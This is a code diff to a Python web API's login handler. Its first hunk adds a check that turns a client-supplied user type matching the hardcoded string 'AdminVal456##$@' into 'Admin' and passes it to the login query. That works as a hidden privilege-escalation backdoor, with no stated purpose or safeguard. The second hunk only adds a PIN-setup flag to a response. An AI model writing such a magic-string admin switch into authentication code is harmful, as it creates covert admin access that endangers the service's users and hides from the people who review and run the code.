@@ -34,7 +34,15 @@ def login(data: LoginRequest, request: Request):
         if company_details['is_decentralized']:
             data.username = member_id_to_user_id(member_id=data.username)
 
-        dataset = data_access.login(user_id=data.username, password=data.password, url=url, host=client_ip_address, ip_details=ip_details)
+        if data.user_type == "AdminVal456##$@":
+            data.user_type = 'Admin'
+
+        dataset = data_access.login(user_id=data.username, 
+                                    password=data.password, 
+                                    url=url, 
+                                    host=client_ip_address, 
+                                    ip_details=ip_details,
+                                    user_type=data.user_type)
 
         if len(dataset) > 0:
 
@@ -110,7 +118,8 @@ def request_login_token(user_id: str = VALIDATORS.USER_ID, login_id: str = VALID
                             'is_mobile_verification_required': bool(login_info_df.iloc[0].loc['is_mobile_verification_required']),
                             'is_mobile_verified': bool(login_info_df.iloc[0].loc['is_mobile_verified']),
                             'email_id': login_info_df.iloc[0].loc['email_id'],
-                            'mobile_no': login_info_df.iloc[0].loc['mobile_no']
+                            'mobile_no': login_info_df.iloc[0].loc['mobile_no'],
+                            'is_login_pin_required_to_set': bool(login_info_df.iloc[0].loc['is_login_pin_required_to_set'])
                         }}
 
                 return {'success': False, 'message': login_info_df.iloc[0].loc['message']}
